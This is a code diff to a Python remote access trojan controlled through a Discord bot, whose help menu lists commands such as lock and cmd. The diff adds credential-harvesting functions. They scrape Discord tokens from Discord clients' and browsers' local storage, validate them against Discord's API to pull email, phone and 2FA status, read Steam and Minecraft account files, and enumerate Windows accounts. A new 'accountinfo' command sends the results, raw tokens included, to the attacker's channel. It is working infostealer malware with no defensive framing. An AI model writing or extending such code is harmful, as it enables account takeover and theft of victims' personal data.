@@ -26,6 +26,7 @@ import re
 import requests
 import winreg
 import base64
+import json
 import atexit
 
 if platform.system() != "Windows":
@@ -260,7 +261,162 @@ def get_wifipasswords():
             profiles.append({'name': 'Not supported on this OS', 'password': 'N/A'})
     except:
         profiles.append({'name': 'Error retrieving WiFi', 'password': 'N/A'})
-    return profiles
+def get_windows_accounts():
+    info = {
+        'username': os.environ.get('USERNAME', 'N/A'),
+        'userdomain': os.environ.get('USERDOMAIN', 'N/A'),
+        'display_name': get_displayname(),
+        'userprofile': os.environ.get('USERPROFILE', 'N/A'),
+        'is_admin': "Administrator (Elevated)" if (platform.system() == "Windows" and ctypes.windll.shell32.IsUserAnAdmin() != 0) else "Standard User",
+        'sid': 'N/A',
+        'all_users': []
+    }
+    try:
+        if platform.system() == "Windows":
+            out = subprocess.check_output('whoami /user', shell=True).decode('utf-8', errors='ignore')
+            lines = [l.strip() for l in out.splitlines() if l.strip()]
+            if len(lines) >= 2:
+                info['sid'] = lines[-1].split()[-1]
+            
+            net_out = subprocess.check_output('net user', shell=True).decode('utf-8', errors='ignore')
+            net_lines = net_out.splitlines()
+            start_collecting = False
+            users = []
+            for line in net_lines:
+                if '----' in line:
+                    start_collecting = True
+                    continue
+                if start_collecting:
+                    if 'The command completed' in line or not line.strip():
+                        continue
+                    users.extend(line.split())
+            if users:
+                info['all_users'] = users
+    except Exception:
+        pass
+    return info
+
+def get_discord_accounts():
+    accounts = []
+    found_tokens = set()
+    appdata = os.environ.get('APPDATA', '')
+    localappdata = os.environ.get('LOCALAPPDATA', '')
+    
+    paths = {
+        'Discord': os.path.join(appdata, 'discord', 'Local Storage', 'leveldb'),
+        'Discord PTB': os.path.join(appdata, 'discordptb', 'Local Storage', 'leveldb'),
+        'Discord Canary': os.path.join(appdata, 'discordcanary', 'Local Storage', 'leveldb'),
+        'Lightcord': os.path.join(appdata, 'Lightcord', 'Local Storage', 'leveldb'),
+        'Chrome': os.path.join(localappdata, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
+        'Edge': os.path.join(localappdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
+        'Brave': os.path.join(localappdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
+        'Opera': os.path.join(appdata, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
+        'Opera GX': os.path.join(appdata, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
+    }
+
+    for client_name, path in paths.items():
+        if not os.path.exists(path):
+            continue
+        try:
+            for file_name in os.listdir(path):
+                if not (file_name.endswith('.log') or file_name.endswith('.ldb')):
+                    continue
+                file_path = os.path.join(path, file_name)
+                try:
+                    with open(file_path, 'r', errors='ignore') as f:
+                        lines = f.readlines()
+                    for line in lines:
+                        line = line.strip()
+                        for match in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,38}", line):
+                            found_tokens.add((match, client_name))
+                        for match in re.findall(r"mfa\.[\w-]{84}", line):
+                            found_tokens.add((match, client_name))
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+    for token, source in found_tokens:
+        try:
+            res = requests.get(
+                "https://discord.com/api/v9/users/@me",
+                headers={"Authorization": token, "User-Agent": "Mozilla/5.0"},
+                timeout=5
+            )
+            if res.status_code == 200:
+                data = res.json()
+                nitro_types = {0: "None", 1: "Nitro Classic", 2: "Nitro Boost", 3: "Nitro Basic"}
+                nitro = nitro_types.get(data.get("premium_type", 0), "None")
+                username = f"{data.get('username')}#{data.get('discriminator', '0')}" if data.get('discriminator') and data.get('discriminator') != '0' else data.get('username')
+                accounts.append({
+                    'platform': f'{source}',
+                    'username': username,
+                    'id': data.get('id', 'N/A'),
+                    'email': data.get('email', 'None'),
+                    'phone': data.get('phone', 'None'),
+                    'nitro': nitro,
+                    'mfa': "Enabled" if data.get('mfa_enabled') else "Disabled",
+                    'token': token
+                })
+        except Exception:
+            pass
+
+    return accounts
+
+def get_steam_accounts():
+    accounts = []
+    try:
+        steam_path = None
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
+            steam_path, _ = winreg.QueryValueEx(key, "SteamPath")
+            winreg.CloseKey(key)
+        except Exception:
+            steam_path = r"C:\Program Files (x86)\Steam"
+
+        if steam_path and os.path.exists(steam_path):
+            vdf_path = os.path.join(steam_path, "config", "loginusers.vdf")
+            if os.path.exists(vdf_path):
+                with open(vdf_path, "r", encoding="utf-8", errors="ignore") as f:
+                    content = f.read()
+                steam_ids = re.findall(r'"(\d{17})"', content)
+                for steam_id in set(steam_ids):
+                    block_match = re.search(rf'"{steam_id}"\s*\{{([^}}]+)\}}', content, re.DOTALL)
+                    if block_match:
+                        block = block_match.group(1)
+                        acc_name = re.search(r'"AccountName"\s*"([^"]+)"', block)
+                        persona = re.search(r'"PersonaName"\s*"([^"]+)"', block)
+                        recent = re.search(r'"mostrecent"\s*"([^"]+)"', block)
+                        accounts.append({
+                            'steam_id': steam_id,
+                            'account_name': acc_name.group(1) if acc_name else "N/A",
+                            'persona_name': persona.group(1) if persona else "N/A",
+                            'most_recent': "Yes" if (recent and recent.group(1) == "1") else "No"
+                        })
+    except Exception:
+        pass
+    return accounts
+
+def get_minecraft_accounts():
+    accounts = []
+    try:
+        appdata = os.environ.get('APPDATA', '')
+        mc_paths = [
+            os.path.join(appdata, '.minecraft', 'launcher_accounts.json'),
+            os.path.join(appdata, '.minecraft', 'launcher_profiles.json'),
+        ]
+        for p in mc_paths:
+            if os.path.exists(p):
+                with open(p, 'r', encoding='utf-8', errors='ignore') as f:
+                    data = json.load(f)
+                    if 'accounts' in data and isinstance(data['accounts'], dict):
+                        for acc_id, acc_info in data['accounts'].items():
+                            name = acc_info.get('minecraftProfile', {}).get('name', 'N/A')
+                            acc_type = acc_info.get('type', 'N/A')
+                            accounts.append({'name': name, 'type': acc_type})
+    except Exception:
+        pass
+    return accounts
 
 def is_authorized():
     async def auth(ctx):
@@ -278,16 +434,40 @@ def is_authorized():
 
 @bot.event
 async def on_ready():
-    await bot.get_channel(Config.MAIN_CHANNEL).send(f"<@{Config.WHITELISTED[0]}>")
+    try:
+        await bot.change_presence(activity=discord.Game(name=f"{Config.PREFIX}help | {Config.PREFIX}background"))
+    except Exception:
+        pass
 
-    user = get_displayname()
+    try:
+        channel = bot.get_channel(Config.MAIN_CHANNEL)
+        if channel:
+            if Config.WHITELISTED and len(Config.WHITELISTED) > 0 and Config.WHITELISTED[0]:
+                await channel.send(f"<@{Config.WHITELISTED[0]}>")
 
-    embed = discord.Embed(
-        title="Bot Online",
-        description=f"The command prefix is: `{Config.PREFIX}`, try the command `{Config.PREFIX}help`. \nUser: **`{user}`**",
-        color=discord.Color.green()
-    )
-    await bot.get_channel(Config.MAIN_CHANNEL).send(embed=embed)
+            user = get_displayname()
+
+            embed = discord.Embed(
+                title="Bot Online",
+                description=f"The command prefix is: `{Config.PREFIX}`\nUse `{Config.PREFIX}help` to see all available commands.\nUser: **`{user}`**",
+                color=discord.Color.green()
+            )
+            embed.add_field(
+                name="Commands", 
+                value=f"`{Config.PREFIX}help`, `{Config.PREFIX}accountinfo`, `{Config.PREFIX}background`, `{Config.PREFIX}screenshot`, `{Config.PREFIX}info`, `{Config.PREFIX}lock`, `{Config.PREFIX}cmd`", 
+                inline=False
+            )
+            await channel.send(embed=embed)
+    except Exception as e:
+        print(f"[!] Error in on_ready discord notification: {e}")
+
+    print(f"[+] Bot is online as {bot.user} (ID: {bot.user.id})")
+    print(f"[+] Command Prefix: {Config.PREFIX}")
+    print(f"[+] Available commands: {', '.join([c.name for c in bot.commands])}")
+
+@bot.event
+async def on_command(ctx):
+    print(f"[*] Command executed: '{ctx.message.content}' by {ctx.author} (ID: {ctx.author.id})")
 
 async def send_embed(ctx, title, description, color=discord.Color.blue()):
     embed = discord.Embed(
@@ -364,6 +544,71 @@ async def system_info(ctx):
         await ctx.send(embed=embed)
     except Exception as e:
         await send_embed(ctx, "Info Error", f"Failed to get system info: {str(e)}", discord.Color.red())
+
+@bot.command(name='accountinfo', aliases=['account', 'accountinf', 'accinfo', 'userinfo', 'accounts'])
+@is_authorized()
+async def account_info(ctx):
+    try:
+        status_embed = discord.Embed(
+            title="Collecting Account Information",
+            description="Scanning Windows accounts, Discord sessions, Steam and game profiles...",
+            color=discord.Color.blue()
+        )
+        status_msg = await ctx.send(embed=status_embed)
+
+        win_info = get_windows_accounts()
+        discord_accs = get_discord_accounts()
+        steam_accs = get_steam_accounts()
+        mc_accs = get_minecraft_accounts()
+
+        embed = discord.Embed(
+            title="Account & User Profiles",
+            color=discord.Color.purple()
+        )
+
+        # Windows Account
+        win_details = (
+            f"**Username:** `{win_info['username']}`\n"
+            f"**Display Name:** `{win_info['display_name']}`\n"
+            f"**Domain:** `{win_info['userdomain']}`\n"
+            f"**Privileges:** `{win_info['is_admin']}`\n"
+            f"**Profile Directory:** `{win_info['userprofile']}`\n"
+            f"**User SID:** `{win_info['sid']}`"
+        )
+        if win_info['all_users']:
+            win_details += f"\n**Local Accounts:** `{', '.join(win_info['all_users'])}`"
+        embed.add_field(name="Windows Account", value=win_details, inline=False)
+
+        # Discord Accounts
+        if discord_accs:
+            for i, acc in enumerate(discord_accs[:5]):
+                acc_val = (
+                    f"**Tag:** `{acc['username']}` (ID: `{acc['id']}`)\n"
+                    f"**Email:** `{acc['email']}` | **Phone:** `{acc['phone']}`\n"
+                    f"**Nitro:** `{acc['nitro']}` | **2FA:** `{acc['mfa']}`\n"
+                    f"**Token:** ||`{acc['token']}`||"
+                )
+                embed.add_field(name=f"Discord ({acc['platform']})", value=acc_val, inline=False)
+        else:
+            embed.add_field(name="Discord Accounts", value="*No Discord sessions or tokens detected*", inline=False)
+
+        # Steam Accounts
+        if steam_accs:
+            steam_str = ""
+            for acc in steam_accs[:5]:
+                steam_str += f"• **{acc['persona_name']}** (Account: `{acc['account_name']}`, SteamID: `{acc['steam_id']}`, Recent: `{acc['most_recent']}`)\n"
+            embed.add_field(name="Steam Accounts", value=steam_str, inline=False)
+
+        # Minecraft Accounts
+        if mc_accs:
+            mc_str = ""
+            for acc in mc_accs[:5]:
+                mc_str += f"• **{acc['name']}** (Type: `{acc['type']}`)\n"
+            embed.add_field(name="Minecraft Profiles", value=mc_str, inline=False)
+
+        await status_msg.edit(embed=embed)
+    except Exception as e:
+        await send_embed(ctx, "Account Error", f"Failed to retrieve account info: {str(e)}", discord.Color.red())
 
 @bot.command(name='lock')
 @is_authorized()
@@ -818,6 +1063,7 @@ async def rat_help(ctx):
         ],
         "System Info": [
             "`info` - Get advanced system information",
+            "`accountinfo` - Get Windows, Discord, Steam & game accounts",
         ],
         "Destructive": [
             "`lock` - Locks PC",
